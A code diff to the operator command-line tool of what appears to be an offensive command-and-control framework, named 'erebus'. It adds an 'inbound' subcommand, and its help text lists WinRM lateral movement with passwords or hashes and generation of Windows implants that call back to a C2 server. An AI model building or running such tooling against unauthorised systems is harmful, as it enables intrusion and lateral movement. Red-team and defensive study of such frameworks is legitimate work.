@@ -12,6 +12,7 @@ import (
 	"time"
 
 	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
+	"github.com/KKingZero/erebus-exploit-framwork/pkg/preimplant"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials"
 	"google.golang.org/protobuf/proto"
@@ -30,7 +31,11 @@ type OpOptions struct {
 // RunOp executes a one-shot operator command (sessions|shell|lateral|pending|approve-all).
 func RunOp(opts OpOptions, args []string) error {
 	if len(args) < 1 {
-		return fmt.Errorf("usage: erebus op <sessions|shell|lateral|pending|approve-all|generate|register-secret|help> [args]")
+		return fmt.Errorf("usage: erebus op <sessions|shell|lateral|pending|approve-all|generate|register-secret|inbound|help> [args]")
+	}
+	// Host-local: no teamserver / certs. Same as `erebus inbound`.
+	if args[0] == "inbound" {
+		return preimplant.RunInbound(args[1:])
 	}
 	if opts.Server == "" {
 		opts.Server = "127.0.0.1:50051"
@@ -92,8 +97,9 @@ const opHelp = `erebus op — non-interactive operator commands (dual-seat auto-
   erebus op lateral winrm <target> <command> --user U --domain D (--pass P | --hash H)
   erebus op generate --os windows --language c --callback https://C2:8443 --out implant.exe
   erebus op register-secret <implant_id> <secret_hex> [build_id]
+  erebus op inbound [status|env|tunnel]     # no teamserver / certs
 
-Uses ~/.erebus/certs/operator*.pem and approver*.pem by default.
+Uses ~/.erebus/certs/operator*.pem and approver*.pem by default (except inbound).
 Flags (before subcommand): -server -cert -key -ca -approver-cert -approver-key
 
 `
